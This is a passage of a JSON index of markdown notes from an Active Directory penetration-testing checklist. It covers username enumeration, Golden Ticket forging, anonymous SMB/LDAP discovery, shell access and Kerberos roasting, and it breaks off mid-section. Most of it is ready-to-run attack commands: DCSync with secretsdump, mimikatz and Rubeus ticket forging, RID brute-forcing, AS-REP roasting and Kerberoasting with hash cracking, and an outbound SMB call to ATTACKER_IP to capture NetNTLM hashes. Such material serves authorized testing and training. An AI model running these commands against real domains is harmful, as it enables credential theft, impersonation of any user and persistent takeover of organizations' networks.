appropriate.\r\n\r\n---\r\n\r\n# 14. GPO Persistence\r\n\r\nReview writable Group Policy Objects.\r\n\r\nPossible abuses:\r\n\r\n- Scheduled Tasks\r\n- Startup Scripts\r\n- Logon Scripts\r\n- Registry Preferences\r\n\r\nUseful tools:\r\n\r\n- SharpGPOAbuse\r\n- PowerGPOAbuse\r\n\r\n---\r\n\r\n# 15. Review Existing Persistence\r\n\r\nEnumerate existing persistence mechanisms.\r\n\r\nCheck:\r\n\r\n- ACLs\r\n- Delegation\r\n- AD CS\r\n- Scheduled Tasks\r\n- GPOs\r\n- Service Accounts\r\n- Shadow Credentials\r\n\r\n---\r\n\r\n## Tips\r\n\r\n- Golden Tickets require the KRBTGT hash.\r\n- Silver Tickets require only the target service account hash.\r\n- Shadow Credentials are often quieter than password resets.\r\n- AD CS misconfigurations can provide durable persistence without modifying passwords.\r\n- Writable GPOs can affect many systems simultaneously.\r\n- Always document every persistence mechanism used during an engagement.\r\n\r\n---\r\n\r\n## Checklist\r\n\r\n- [ ] Verify Domain Admin access.\r\n- [ ] Create a Golden Ticket (if applicable).\r\n- [ ] Create Silver Tickets (if applicable).\r\n- [ ] Test Pass-the-Ticket.\r\n- [ ] Review AdminSDHolder.\r\n- [ ] Review ACL persistence opportunities.\r\n- [ ] Test RBCD.\r\n- [ ] Test Shadow Credentials.\r\n- [ ] Enumerate AD CS.\r\n- [ ] Review SID History.\r\n- [ ] Review privileged group memberships.\r\n- [ ] Review computer account abuse.\r\n- [ ] Review writable GPOs.\r\n- [ ] Enumerate existing persistence mechanisms.\r\n- [ ] Document all persistence methods.",
    "headings": [],
    "commands": [],
    "tags": [
      "mimikatz",
      "certipy",
      "rubeus",
      "impacket",
      "silver ticket",
      "golden ticket",
      "pass-the-ticket",
      "esc1",
      "kerberos",
      "rce",
      "persistence"
    ],
    "size": 4622,
    "lineCount": 280
  },
  {
    "id": "ad-checklist-02-domain-user-enumeration",
    "title": "Domain User Enumeration",
    "category": "Active Directory & Kerberos",
    "subcategory": "AD-Checklist",
    "filePath": "AD-Checklist/02. Domain User Enumeration.md",
    "content": "# Username Collection\r\n\r\n## Objective\r\n\r\nEnumerate valid domain usernames using unauthenticated and authenticated techniques. A comprehensive user list is essential for password spraying, Kerberoasting, AS-REP Roasting, BloodHound collection, and other Active Directory attacks.\r\n\r\n---\r\n\r\n## 1. Enumerate Users with Kerbrute\r\n\r\nUse **Kerbrute** to validate usernames without generating failed login events (Kerberos pre-authentication requests).\r\n\r\n### Using the SecLists xato Username Wordlist\r\n\r\n```bash\r\nkerbrute userenum -d <DOMAIN.LOCAL> --dc <DC_IP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt\r\n```\r\n\r\n### Example\r\n\r\n```bash\r\nkerbrute userenum -d corp.local --dc 192.168.1.10 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt\r\n```\r\n\r\n> **Purpose:** Identify valid Active Directory usernames for further attacks.\r\n\r\n---\r\n\r\n## 2. Enumerate Users via RID Bruteforce\r\n\r\nIf anonymous or authenticated SMB access is available, enumerate domain users by brute-forcing Relative Identifiers (RIDs).\r\n\r\n```bash\r\nnxc smb <TARGET_IP> -u '' -p '' --rid-brute\r\n\r\n# By default, RID brute-forcing enumerates RIDs up to 4000.\r\n# If the highest discovered RID is close to 4000, increase the limit and run it again.\r\n\r\nnxc smb <TARGET_IP> -u '' -p '' --rid-brute 6000\r\n\r\n# If necessary, increase it further:\r\n\r\nnxc smb <TARGET_IP> -u '' -p '' --rid-brute 8000\r\n```\r\n\r\n### Example Output\r\n\r\n```text\r\n500  Administrator\r\n501  Guest\r\n502  krbtgt\r\n1103 jsmith\r\n1104 svc_backup\r\n```\r\n\r\n> **Purpose:** Recover usernames even when LDAP enumeration is restricted.\r\n\r\n---\r\n\r\n## 3. Enumerate Users over SMB\r\n\r\nIf valid credentials are available, retrieve domain users through SMB.\r\n\r\n```bash\r\nnxc smb <TARGET_IP> -u <USER> -p <PASSWORD> --users\r\n```\r\n\r\n### Using NTLM Hashes\r\n\r\n```bash\r\nnxc smb <TARGET_IP> -u <USER> -H <NTLM_HASH> --users\r\n```\r\n\r\n> **Purpose:** Enumerate users using authenticated SMB sessions.\r\n\r\n---\r\n\r\n## 4. Enumerate Users over LDAP\r\n\r\nLDAP often provides richer user information than SMB.\r\n\r\n```bash\r\nnxc ldap <TARGET_IP> -u <USER> -p <PASSWORD> --users\r\n```\r\n\r\n### Using NTLM Hashes\r\n\r\n```bash\r\nnxc ldap <TARGET_IP> -u <USER> -H <NTLM_HASH> --users\r\n```\r\n\r\n> **Note:** In some environments, `--rid-brute` succeeds while `ldap --users` is restricted due to LDAP permissions.\r\n\r\n---\r\n\r\n## 5. Enumerate Users with rpcclient\r\n\r\nIf RPC allows anonymous or authenticated access:\r\n\r\n```bash\r\nrpcclient -U \"\" -N <TARGET_IP>\r\n```\r\n\r\nInside the RPC shell:\r\n\r\n```text\r\nenumdomusers\r\n```\r\n\r\nOther useful commands:\r\n\r\n```text\r\nenumdomgroups\r\nqueryuser <RID>\r\nquerydispinfo\r\n```\r\n\r\n> **Purpose:** Enumerate domain users through the RPC service.\r\n\r\n---\r\n\r\n## 6. Check User Descriptions\r\n\r\nUser description fields frequently contain valuable information such as:\r\n\r\n- Temporary passwords\r\n- Initial passwords\r\n- Employee IDs\r\n- Email addresses\r\n- Department names\r\n- Service account notes\r\n\r\n### Using SMB\r\n\r\n```bash\r\nnxc smb <TARGET_IP> -u <USER> -p <PASSWORD> --users\r\n```\r\n\r\n### Using LDAP\r\n\r\n```bash\r\nnxc ldap <TARGET_IP> -u <USER> -p <PASSWORD> --users\r\n```\r\n\r\n> **Look for:**\r\n>\r\n> - `Password: Summer2024!`\r\n> - `Temp Password`\r\n> - `VPN Account`\r\n> - `Service Account`\r\n> - `Do not disable`\r\n> - `SQL Service`\r\n> - `Backup Account`\r\n\r\n---\r\n\r\n## 7. Build a Master Username List\r\n\r\nCombine usernames from all enumeration methods into a single file.\r\n\r\n```bash\r\ncat kerbrute.txt rid-brute.txt ldap-users.txt smb-users.txt | sort -u > users.txt\r\n```\r\n\r\n### Verify the Number of Users\r\n\r\n```bash\r\nwc -l users.txt\r\n```\r\n\r\n> **Purpose:** Create a clean username list for password spraying, Kerberoasting, AS-REP Roasting, BloodHound, and other AD enumeration activities.\r\n\r\n---\r\n\r\n## Tips\r\n\r\n- Use multiple enumeration techniques—different services may expose different users.\r\n- RID bruteforcing can succeed even when LDAP enumeration is blocked.\r\n- LDAP typically exposes additional attributes (description, email, groups, etc.).\r\n- Always inspect user descriptions for accidentally exposed credentials.\r\n- Remove duplicate usernames before using the list for password spraying or Kerberos attacks.\r\n\r\n---\r\n\r\n## Checklist\r\n\r\n- [ ] Enumerate users with Kerbrute.\r\n- [ ] Perform RID bruteforcing using nxc.\r\n- [ ] Enumerate users over SMB.\r\n- [ ] Enumerate users over LDAP.\r\n- [ ] Enumerate users using rpcclient.\r\n- [ ] Review user descriptions for passwords or sensitive information.\r\n- [ ] Merge and deduplicate all discovered usernames into a master list.\r\n",
    "headings": [],
    "commands": [],
    "tags": [
      "bloodhound",
      "kerberoasting",
      "ldap",
      "smb",
      "kerberos",
      "rce"
    ],
    "size": 4483,
    "lineCount": 194
  },
  {
    "id": "ad-checklist-00-final-ad-attack-flow",
    "title": "Final AD Attack Flow",
    "category": "Active Directory & Kerberos",
    "subcategory": "AD-Checklist",
    "filePath": "AD-Checklist/00. Final AD Attack Flow.md",
    "content": "## Index\r\n```\r\n1. Host Discovery & Initial Enumeration\r\n        │\r\n        ▼\r\n2. Domain User Enumeration\r\n        │\r\n        ▼\r\n3. Kerberos-Based Attacks\r\n        │\r\n        ▼\r\n4. Credential Validation & Authentication Testing\r\n        │\r\n        ▼\r\n5. SMB Share Enumeration & File Discovery\r\n        │\r\n        ▼\r\n6. Interactive Shell Access & Session Management\r\n        │\r\n        ▼\r\n7. Windows Post-Exploitation & Credential Hunting\r\n        │\r\n        ▼\r\n8. Local Administrator Post-Exploitation\r\n        │\r\n        ▼\r\n9. Credential Abuse & Lateral Movement\r\n        │\r\n        ▼\r\n10. Active Directory Enumeration\r\n    (BloodHound, ACLs, GPOs, Trusts & Delegation)\r\n        │\r\n        ▼\r\n11. Kerberos Ticket Abuse\r\n    ├── Pass-the-Ticket\r\n    ├── Silver Ticket\r\n    └── Golden Ticket\r\n        │\r\n        ▼\r\n12. Pivoting & Network Lateral Movement\r\n        │\r\n        ▼\r\n13. Domain Persistence\r\n```",
    "headings": [],
    "commands": [],
    "tags": [
      "bloodhound",
      "silver ticket",
      "golden ticket",
      "pass-the-ticket",
      "smb",
      "kerberos",
      "persistence",
      "lateral movement"
    ],
    "size": 969,
    "lineCount": 44
  },
  {
    "id": "ad-checklist-11-kerberos-attacks-golden-ticket",
    "title": "Golden Ticket",
    "category": "Active Directory & Kerberos",
    "subcategory": "AD-Checklist / 11. Kerberos Attacks",
    "filePath": "AD-Checklist/11. Kerberos Attacks/Golden Ticket.md",
    "content": "# Golden Ticket Attack\r\n\r\n## Objective\r\n\r\nA **Golden Ticket** is a forged Kerberos **Ticket Granting Ticket (TGT)** created using the **KRBTGT account's secret key (NTLM or AES)**. Possession of the KRBTGT key allows an attacker to generate valid TGTs for any user, effectively impersonating any account in the domain until the KRBTGT password is reset (typically twice).\r\n\r\nUnlike a Silver Ticket, a Golden Ticket is **not limited to a single service**. It can be used to request legitimate service tickets (TGS) for any service the forged identity is authorized to access.\r\n\r\n---\r\n\r\n# Requirements\r\n\r\nBefore creating a Golden Ticket, you need:\r\n\r\n- KRBTGT NTLM hash **or** AES128/AES256 key\r\n- Domain SID\r\n- Domain FQDN\r\n- Username to impersonate (commonly `Administrator`)\r\n\r\n---\r\n\r\n# How to Obtain the KRBTGT Hash\r\n\r\nThe KRBTGT hash is typically obtained after compromising a highly privileged account.\r\n\r\nCommon methods include:\r\n\r\n- DCSync\r\n- NTDS.dit extraction\r\n- LSASS dump on a Domain Controller\r\n- Domain Admin access\r\n\r\nExample (DCSync):\r\n\r\n```bash\r\nimpacket-secretsdump -just-dc <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>\r\n```\r\n\r\nLook for:\r\n\r\n```text\r\nkrbtgt:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>\r\n```\r\n\r\n---\r\n\r\n# Collect Required Information\r\n\r\n## Domain SID\r\n\r\n### Windows\r\n\r\n```cmd\r\nwhoami /user\r\n```\r\n\r\n### Linux\r\n\r\n```bash\r\nimpacket-lookupsid <DOMAIN>/<USER>@<DC_IP> -hashes :<NTLM_HASH>\r\n```\r\n\r\n---\r\n\r\n## Domain Name\r\n\r\n```text\r\ncorp.local\r\n```\r\n\r\n---\r\n\r\n## KRBTGT Hash\r\n\r\nExample:\r\n\r\n```text\r\nkrbtgt:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>\r\n```\r\n\r\n---\r\n\r\n# Create a Golden Ticket (Linux)\r\n\r\n## Using NTLM Hash\r\n\r\n```bash\r\nticketer.py -domain <DOMAIN> -domain-sid <DOMAIN_SID> -nthash <KRBTGT_NTLM_HASH> Administrator\r\n```\r\n\r\n## Using AES128 Key\r\n\r\n```bash\r\nticketer.py -domain <DOMAIN> -domain-sid <DOMAIN_SID> -aesKey <AES128_KEY> Administrator\r\n```\r\n\r\n## Using AES256 Key\r\n\r\n```bash\r\nticketer.py -domain <DOMAIN> -domain-sid <DOMAIN_SID> -aesKey <AES256_KEY> Administrator\r\n```\r\n\r\nOutput:\r\n\r\n```text\r\nAdministrator.ccache\r\n```\r\n\r\n---\r\n\r\n# Load the Golden Ticket (Linux)\r\n\r\n```bash\r\nexport KRB5CCNAME=$(pwd)/Administrator.ccache\r\n```\r\n\r\nVerify:\r\n\r\n```bash\r\nklist\r\n```\r\n\r\n---\r\n\r\n# Use the Golden Ticket (Linux)\r\n\r\n## SMB\r\n\r\n```bash\r\nimpacket-smbclient -k -no-pass //<TARGET>/C$\r\n```\r\n\r\n## PsExec\r\n\r\n```bash\r\nimpacket-psexec -k -no-pass <DOMAIN>/Administrator@<TARGET>\r\n```\r\n\r\n## WMIExec\r\n\r\n```bash\r\nimpacket-wmiexec -k -no-pass <DOMAIN>/Administrator@<TARGET>\r\n```\r\n\r\n## SMBExec\r\n\r\n```bash\r\nimpacket-smbexec -k -no-pass <DOMAIN>/Administrator@<TARGET>\r\n```\r\n\r\n## MSSQL\r\n\r\n```bash\r\nimpacket-mssqlclient -k -no-pass <TARGET>\r\n```\r\n\r\n## LDAP\r\n\r\n```bash\r\nldapsearch -Y GSSAPI ...\r\n```\r\n\r\n---\r\n\r\n# Create a Golden Ticket (Windows)\r\n\r\n## Mimikatz (RC4 / NTLM)\r\n\r\n```text\r\nkerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NTLM_HASH> /user:Administrator /ptt\r\n```\r\n\r\n## Mimikatz (AES128)\r\n\r\n```text\r\nkerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /aes128:<AES128_KEY> /user:Administrator /ptt\r\n```\r\n\r\n## Mimikatz (AES256)\r\n\r\n```text\r\nkerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /aes256:<AES256_KEY> /user:Administrator /ptt\r\n```\r\n\r\n> **Note:** The `/ptt` option immediately injects the forged TGT into the current logon session.\r\n\r\n---\r\n\r\n# Create a Golden Ticket (Rubeus)\r\n\r\n## Using AES256\r\n\r\n```powershell\r\nRubeus.exe golden /aes256:<KRBTGT_AES256_KEY> /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /ptt\r\n```\r\n\r\n## Using RC4 (NTLM)\r\n\r\n```powershell\r\nRubeus.exe golden /rc4:<KRBTGT_NTLM_HASH> /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /ptt\r\n```\r\n\r\n---\r\n\r\n# Verify the Ticket\r\n\r\nWindows:\r\n\r\n```cmd\r\nklist\r\n```\r\n\r\nLinux:\r\n\r\n```bash\r\nklist\r\n```\r\n\r\n---\r\n\r\n# Request Service Tickets\r\n\r\nAfter injecting the Golden Ticket, Windows or Impacket will request legitimate service tickets as needed.\r\n\r\nExamples:\r\n\r\n## SMB\r\n\r\n```cmd\r\ndir \\\\<TARGET>\\C$\r\n```\r\n\r\n## WinRM\r\n\r\n```powershell\r\nEnter-PSSession -ComputerName <TARGET>\r\n```\r\n\r\n## PsExec\r\n\r\n```bash\r\nimpacket-psexec -k -no-pass <DOMAIN>/Administrator@<TARGET>\r\n```\r\n\r\n## WMIExec\r\n\r\n```bash\r\nimpacket-wmiexec -k -no-pass <DOMAIN>/Administrator@<TARGET>\r\n```\r\n\r\n## MSSQL\r\n\r\n```bash\r\nimpacket-mssqlclient -k -no-pass <TARGET>\r\n```\r\n\r\n---\r\n\r\n# Cleanup\r\n\r\n## Windows (Mimikatz)\r\n\r\n```text\r\nkerberos::purge\r\n```\r\n\r\n## Windows\r\n\r\n```cmd\r\nklist purge\r\n```\r\n\r\n## Linux\r\n\r\n```bash\r\nunset KRB5CCNAME\r\n```\r\n\r\n---\r\n\r\n# Golden Ticket vs Silver Ticket\r\n\r\n| Feature | Golden Ticket | Silver Ticket |\r\n|---------|---------------|---------------|\r\n| Ticket Type | TGT | TGS |\r\n| Required Secret | KRBTGT hash/key | Service account hash/key |\r\n| Scope | Entire domain | Single service |\r\n| Contacts KDC | Yes (to request TGS tickets) | No |\r\n| Typical Prerequisite | Domain compromise | Service account compromise |\r\n\r\n---\r\n\r\n# Common Use Cases\r\n\r\n- Authenticate as any domain user.\r\n- Request service tickets for any domain service.\r\n- Access SMB administrative shares.\r\n- Authenticate to WinRM.\r\n- Execute remote commands.\r\n- Access MSSQL.\r\n- Query LDAP.\r\n- Perform administrative actions across the domain.\r\n\r\n---\r\n\r\n# Limitations\r\n\r\n- Requires the KRBTGT key, which generally means the domain has already been heavily compromised.\r\n- Forged tickets become invalid after the KRBTGT password is changed (typically changed twice to invalidate existing tickets).\r\n- Time synchronization between the attacker and the domain is important for Kerberos authentication.\r\n\r\n---\r\n\r\n# Tips\r\n\r\n- Obtain the KRBTGT hash through DCSync or NTDS.dit extraction.\r\n- Save both NTLM and AES keys if available.\r\n- Verify injected tickets with `klist`.\r\n- Prefer AES keys in modern environments where RC4 may be disabled.\r\n- A Golden Ticket allows requesting legitimate service tickets for any accessible service in the domain.\r\n- Re-run BloodHound after obtaining Domain Admin privileges to identify any remaining attack paths or persistence opportunities.\r\n\r\n---\r\n\r\n# Checklist\r\n\r\n- [ ] Obtain the KRBTGT NTLM hash or AES key.\r\n- [ ] Recover the Domain SID.\r\n- [ ] Create a Golden Ticket.\r\n- [ ] Inject or load the forged TGT.\r\n- [ ] Verify the ticket with `klist`.\r\n- [ ] Request service tickets as needed.\r\n- [ ] Authenticate to domain services.\r\n- [ ] Purge tickets after testing.\r\n",
    "headings": [],
    "commands": [],
    "tags": [
      "mimikatz",
      "bloodhound",
      "rubeus",
      "impacket",
      "psexec",
      "winrm",
      "silver ticket",
      "golden ticket",
      "ldap",
      "smb",
      "kerberos",
      "persistence"
    ],
    "size": 6265,
    "lineCount": 335
  },
  {
    "id": "ad-checklist-01-host-discovery-initial-enumeration",
    "title": "Host Discovery & Initial Enumeration",
    "category": "Active Directory & Kerberos",
    "subcategory": "AD-Checklist",
    "filePath": "AD-Checklist/01. Host Discovery & Initial Enumeration.md",
    "content": "# Initial Enumeration\r\n\r\n## Objective\r\n\r\nPerform initial reconnaissance against the target to identify exposed services, potential anonymous access, and misconfigurations before proceeding with Active Directory enumeration.\r\n\r\n---\r\n\r\n## 1. Scan All TCP Ports\r\n\r\nIdentify all open TCP ports and the services running on the target.\r\n\r\n### Fast TCP Port Scan\r\n\r\n```bash\r\nnmap -Pn -p- --min-rate 1000 -T4 <TARGET_IP> -oA tcp-all-ports\r\n\r\nOR\r\n# Scanner.sh is in the repo\r\nbash scanner.sh <IP> <output-file-name>\r\n```\r\n\r\n### Service & Version Detection\r\n\r\n```bash\r\nnmap -Pn -sC -sV -p <OPEN_PORTS> <TARGET_IP> -oA tcp-services\r\n```\r\n\r\n> **Tip:** Save the list of open ports from the first scan and use them in the second scan.\r\n\r\n---\r\n\r\n## 2. Scan UDP Ports\r\n\r\nMany Active Directory services (such as DNS, Kerberos, and NTP) use UDP.\r\n\r\n### Top UDP Ports\r\n\r\n```bash\r\nsudo nmap -Pn -sU --top-ports 100 <TARGET_IP> -oA udp-top100\r\n```\r\n\r\n### Full UDP Scan (Optional)\r\n\r\n```bash\r\nsudo nmap -Pn -sU -p- <TARGET_IP> -oA udp-all\r\n```\r\n\r\n> **Note:** Full UDP scans are significantly slower than TCP scans.\r\n\r\n---\r\n\r\n## 3. Check LDAP for Anonymous Access\r\n\r\nDetermine whether the LDAP server allows anonymous binds.\r\n\r\n### LDAP RootDSE Enumeration\r\n\r\n```bash\r\nldapsearch -x -H ldap://<TARGET_IP> -s base\r\n```\r\n\r\n### Attempt Anonymous Directory Enumeration\r\n\r\n```bash\r\nldapsearch -x -H ldap://<TARGET_IP> -b \"DC=<DOMAIN>,DC=<TLD>\"\r\n```\r\n\r\n### Verify LDAP Ports\r\n\r\n- **389** - LDAP\r\n- **636** - LDAPS\r\n- **3268** - Global Catalog\r\n- **3269** - Global Catalog (SSL)\r\n\r\n> **Goal:** Determine whether user, group, or domain information can be retrieved without authentication.\r\n\r\n---\r\n\r\n## 4. Check RPC for Anonymous Access\r\n\r\nDetermine whether the RPC service allows anonymous enumeration.\r\n\r\n### Enumerate Using rpcclient\r\n\r\n```bash\r\nrpcclient -U \"\" -N <TARGET_IP>\r\n```\r\n\r\nIf successful, try:\r\n\r\n```text\r\nenumdomusers\r\nenumdomgroups\r\nquerydominfo\r\nlsaquery\r\n```\r\n\r\n### Alternative (Impacket)\r\n\r\n```bash\r\nlookupsid.py anonymous@<TARGET_IP> -no-pass\r\n```\r\n\r\n> **Goal:** Identify whether users, groups, SIDs, or domain information can be enumerated anonymously.\r\n\r\n---\r\n\r\n## 5. Check SMB for Anonymous Access\r\n\r\nDetermine whether SMB permits anonymous authentication.\r\n\r\n### List Available Shares\r\n\r\n```bash\r\nsmbclient -L //<TARGET_IP> -N\r\n```\r\n\r\n### Enumerate SMB Information\r\n\r\n```bash\r\nenum4linux -a <TARGET_IP>\r\nenum4linux-ng <TARGET_IP>\r\n```\r\n\r\nor\r\n\r\n```bash\r\nnxc smb <TARGET_IP>\r\nnxc smb <TARGET_IP> --generate-hosts-file hosts-file\r\nnxc smb <TARGET_IP>  -u '' -p '' --shares\r\n```\r\n\r\n> **Goal:** Identify accessible shares and determine whether null sessions are permitted.\r\n\r\n---\r\n\r\n## 6. Check for Public SMB Shares\r\n\r\nIdentify readable or writable shares that do not require authentication.\r\n\r\n### Connect to a Share\r\n\r\n```bash\r\nsmbclient //<TARGET_IP>/<SHARE_NAME> -N\r\n```\r\n\r\n### Useful SMB Commands\r\n\r\n```text\r\nls\r\ncd\r\nget <file>\r\nput <file>\r\nmkdir <directory>\r\n```\r\n\r\n### Recursively Download Files\r\n\r\n```bash\r\nsmbclient //<TARGET_IP>/<SHARE_NAME> -N\r\n```\r\n\r\nInside the SMB shell:\r\n\r\n```text\r\nrecurse ON\r\nprompt OFF\r\nmget *\r\n```\r\n\r\n> **Look for:**\r\n>\r\n> - Configuration files\r\n> - Passwords\r\n> - SSH keys\r\n> - Backup files\r\n> - Scripts\r\n> - Database exports\r\n> - Credentials\r\n> - Group Policy Preferences (GPP)\r\n> - Documentation containing sensitive information\r\n\r\n---\r\n\r\n## Common AD Ports\r\n\r\n| Port | Service |\r\n|------|---------|\r\n| 53 | DNS |\r\n| 88 | Kerberos |\r\n| 135 | RPC Endpoint Mapper |\r\n| 139 | NetBIOS Session Service |\r\n| 389 | LDAP |\r\n| 445 | SMB |\r\n| 464 | Kerberos Password Change |\r\n| 593 | RPC over HTTP |\r\n| 636 | LDAPS |\r\n| 3268 | Global Catalog |\r\n| 3269 | Global Catalog (SSL) |\r\n| 5985 | WinRM (HTTP) |\r\n| 5986 | WinRM (HTTPS) |\r\n| 9389 | Active Directory Web Services |\r\n\r\n---\r\n\r\n## Checklist\r\n\r\n- [ ] Scan all TCP ports.\r\n- [ ] Perform service/version detection.\r\n- [ ] Scan common UDP ports.\r\n- [ ] Test for anonymous LDAP access.\r\n- [ ] Test for anonymous RPC access.\r\n- [ ] Test for anonymous SMB access.\r\n- [ ] Enumerate SMB shares.\r\n- [ ] Check for readable and writable public shares.\r\n- [ ] Download interesting files for offline analysis.\r\n",
    "headings": [],
    "commands": [],
    "tags": [
      "nmap",
      "impacket",
      "winrm",
      "ldap",
      "smb",
      "kerberos",
      "sudo"
    ],
    "size": 4166,
    "lineCount": 218
  },
  {
    "id": "ad-checklist-06-interactive-shell-access-session-management",
    "title": "Interactive Shell Access & Session Management",
    "category": "Active Directory & Kerberos",
    "subcategory": "AD-Checklist",
    "filePath": "AD-Checklist/06. Interactive Shell Access & Session Management.md",
    "content": "# Interactive Shell Access & Session Management\r\n\r\n## Objective\r\n\r\nEstablish an interactive session on the target host, maximize functionality, and leverage the session for credential discovery, lateral movement, and privilege escalation.\r\n\r\n---\r\n\r\n## 1. Prefer RDP When Available\r\n\r\nIf the compromised account has Remote Desktop access, prefer RDP over WinRM.\r\n\r\n```bash\r\nxfreerdp3 /u:<USER> /p:<PASSWORD> /v:<TARGET_IP> /dynamic-resolution /drive:sharedfolder,$(pwd)\r\n```\r\n\r\n> **Why?**\r\n>\r\n> - Full interactive desktop.\r\n> - Easier file browsing and tool execution.\r\n> - Avoids many Kerberos Double-Hop limitations encountered with WinRM.\r\n\r\n---\r\n\r\n## 2. Use `runascs.exe` to Switch Users\r\n\r\nIf valid credentials are discovered but the account is not permitted to log in via RDP or WinRM, use `runascs.exe` to execute processes under the new user's context.\r\n\r\nExample:\r\n\r\n```cmd\r\nrunascs.exe <DOMAIN>\\<USER> <PASSWORD> cmd.exe\r\n```\r\n\r\nor\r\n\r\n```cmd\r\nrunascs.exe <DOMAIN>\\<USER> <PASSWORD> powershell.exe\r\n```\r\n\r\n> **Use Case:** Execute commands as another user without requiring an interactive logon.\r\n\r\n---\r\n\r\n## 3. Attempt an Elevated Shell\r\n\r\nIf administrative credentials are available, attempt to launch an elevated Command Prompt or PowerShell session.\r\n\r\nLook for opportunities to execute:\r\n\r\n- `cmd.exe`\r\n- `powershell.exe`\r\n- Administrative MMC consoles\r\n- PsExec or other remote execution utilities\r\n\r\n> **Goal:** Obtain an elevated shell for post-exploitation and lateral movement.\r\n\r\n---\r\n\r\n## 4. Test Outbound SMB Authentication\r\n\r\nOnce a shell is obtained, verify whether the host can authenticate to your listener.\r\n\r\nExample:\r\n\r\n```cmd\r\ndir \\\\<ATTACKER_IP>\\test\r\n```\r\n\r\nMonitor using:\r\n\r\n- Responder (Linux)\r\n- Inveigh (Windows)\r\n\r\n> **Purpose:** Determine whether outbound SMB authentication is permitted and capture NetNTLM credentials if privileged users execute the command.\r\n\r\n---\r\n\r\n## 5. Inspect Environment Variables\r\n\r\nEnvironment variables frequently reveal useful operational information.\r\n\r\n### Command Prompt\r\n\r\n```cmd\r\nset\r\n```\r\n\r\n### PowerShell\r\n\r\n```powershell\r\nGet-ChildItem Env:\r\n```\r\n\r\nLook for:\r\n\r\n- User profile paths\r\n- Temporary directories\r\n- Application configuration\r\n- Installed software paths\r\n- Custom variables\r\n- Credentials accidentally stored in environment variables\r\n\r\n---\r\n\r\n## Quick Situational Awareness\r\n\r\nAfter gaining any shell (WinRM, RDP, PsExec, Evil-WinRM, etc.), I always do this:\r\n```cmd\r\nwhoami /all\r\nwhoami /priv\r\nhostname\r\nipconfig /all\r\nset\r\nklist\r\n```\r\nThese five commands immediately tell you:\r\n\r\n- Current user\r\n- Group memberships\r\n- Enabled privileges (e.g., SeBackupPrivilege, SeImpersonatePrivilege)\r\n- Hostname\r\n- Network configuration\r\n- Environment variables\r\n- Cached Kerberos tickets\r\n\r\n---\r\n\r\n## Tips\r\n\r\n- Prefer RDP whenever possible for a richer post-exploitation experience.\r\n- If remote logon is restricted, try `runascs.exe` to execute commands under another user's context.\r\n- Test outbound SMB connectivity after gaining a shell.\r\n- Review environment variables for operational or credential-related information.\r\n\r\n---\r\n\r\n## Checklist\r\n\r\n- [ ] Attempt RDP access.\r\n- [ ] Use `runascs.exe` if alternate credentials are available.\r\n- [ ] Attempt to obtain an elevated shell.\r\n- [ ] Test outbound SMB authentication.\r\n- [ ] Enumerate environment variables.\r\n",
    "headings": [],
    "commands": [],
    "tags": [
      "psexec",
      "winrm",
      "smb",
      "kerberos",
      "lateral movement"
    ],
    "size": 3345,
    "lineCount": 145
  },
  {
    "id": "ad-checklist-03-kerberos-based-attacks",
    "title": "Kerberos-Based Attacks",
    "category": "Active Directory & Kerberos",
    "subcategory": "AD-Checklist",
    "filePath": "AD-Checklist/03. Kerberos-Based Attacks.md",
    "content": "# Kerberos Attacks\r\n\r\n## Objective\r\n\r\nAbuse Kerberos authentication to obtain crackable ticket material and recover plaintext credentials. These attacks should be performed after building a reliable username list or obtaining valid domain credentials.\r\n\r\n---\r\n\r\n# 1. AS-REP Roasting\r\n\r\n## When to Perform\r\n\r\n- After collecting valid domain usernames.\r\n- Does **not** require valid credentials.\r\n- Targets accounts with **Kerberos pre-authentication disabled**.\r\n\r\n### Enumerate AS-REP Roastable Users\r\n\r\n```bash\r\nGetNPUsers.py <DOMAIN.LOCAL>/ -dc-ip <DC_IP> -usersfile users.txt -request\r\n```\r\n\r\n### Using nxc\r\n\r\n```bash\r\nnxc ldap <DC_IP> -u users.txt -p '' --asreproast asrep_hashes.txt\r\n```\r\n\r\n> **Purpose:** Request AS-REP responses from vulnerable accounts and extract crackable hashes.\r\n\r\n---\r\n\r\n## Crack AS-REP Hashes\r\n\r\n### Using Hashcat\r\n\r\n```bash\r\nhashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt\r\n```\r\n\r\n### Using John the Ripper\r\n\r\n```bash\r\njohn --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt\r\n```\r\n\r\n> **Note:** Successfully cracked passwords can be reused for SMB, LDAP, WinRM, RDP, MSSQL, and other services.\r\n\r\n---\r\n\r\n## Kerberos Downgrade Attack\r\n\r\n### When to Perform\r\n\r\n- After obtaining **valid domain credentials**.\r\n- When performing **Kerberoasting** against service accounts.\r\n- When the domain supports **RC4 (NTLM) encryption** in addition to AES.\r\n- If the service account returns only **AES-encrypted TGS tickets**, which are generally slower to crack than RC4 tickets.\r\n- When you want to force the KDC to issue an **RC4-HMAC** service ticket for faster offline password cracking.\r\n\r\n> **Note:** Modern Active Directory environments may disable RC4 or configure service accounts to support only AES encryption. In such cases, Kerberos downgrade attacks will not succeed.\r\n\r\n### Request AS-REP Hashes with RC4 Encryption\r\n\r\n```bash\r\nGetNPUsers.py <DOMAIN.LOCAL>/ -dc-ip <DC_IP> -usersfile users.txt -request -format hashcat --downgrade\r\n```\r\n\r\n---\r\n\r\n# 3. Kerberoasting\r\n\r\n## When to Perform\r\n\r\n- After obtaining valid domain credentials.\r\n- Targets service accounts with registered Service Principal Names (SPNs).\r\n\r\n### Enumerate & Roast Using nxc\r\n\r\n```bash\r\nnxc ldap <DC_IP> -u <USER> -p <PASSWORD> --kerberoasting kerberoast_hashes.txt\r\n```\r\n\r\n### Using NTLM Hashes\r\n\r\n```bash\r\nnxc ldap <DC_IP> -u <USER> -H <NTLM_HASH> --kerberoasting kerberoast_hashes.txt\r\n```\r\n\r\n> **Purpose:** Enumerate SPN accounts and request crackable TGS tickets.\r\n\r\n---\r\n\r\n### Enumerate & Roast Using 